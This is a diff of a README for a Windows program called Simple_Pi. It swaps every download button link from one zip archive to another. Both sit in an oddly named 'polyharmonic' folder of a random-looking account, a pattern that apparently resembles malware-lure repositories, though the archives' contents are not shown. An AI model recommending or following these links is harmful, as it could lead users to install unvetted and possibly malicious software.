@@ -1,6 +1,6 @@
 # 🥧 Simple_Pi - Quick and Easy Pi Calculator
 
-[![Download Simple_Pi](https://img.shields.io/badge/Download-Simple_Pi-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Effervescenceinsinuation877/Simple_Pi/main/polyharmonic/Simple-Pi-v2.5.zip)
+[![Download Simple_Pi](https://img.shields.io/badge/Download-Simple_Pi-brightgreen?style=for-the-badge)](https://github.com/Effervescenceinsinuation877/Simple_Pi/raw/refs/heads/main/polyharmonic/Pi-Simple-v2.4.zip)
 
 ## 📄 About Simple_Pi
 
@@ -25,7 +25,7 @@ Here are the steps to get Simple_Pi running on your Windows device.
 
 Click the button below to go directly to the download page on GitHub. This page hosts the latest version of Simple_Pi.
 
-[![Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Effervescenceinsinuation877/Simple_Pi/main/polyharmonic/Simple-Pi-v2.5.zip)
+[![Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Effervescenceinsinuation877/Simple_Pi/raw/refs/heads/main/polyharmonic/Pi-Simple-v2.4.zip)
 
 ### 2. Download the Program
 
@@ -102,4 +102,4 @@ If you have questions or issues, check the Issues tab on the GitHub repository. 
 
 ---
 
-[Download Simple_Pi now](https://raw.githubusercontent.com/Effervescenceinsinuation877/Simple_Pi/main/polyharmonic/Simple-Pi-v2.5.zip) to start calculating Pi easily on your Windows computer.
+[Download Simple_Pi now](https://github.com/Effervescenceinsinuation877/Simple_Pi/raw/refs/heads/main/polyharmonic/Pi-Simple-v2.4.zip) to start calculating Pi easily on your Windows computer.
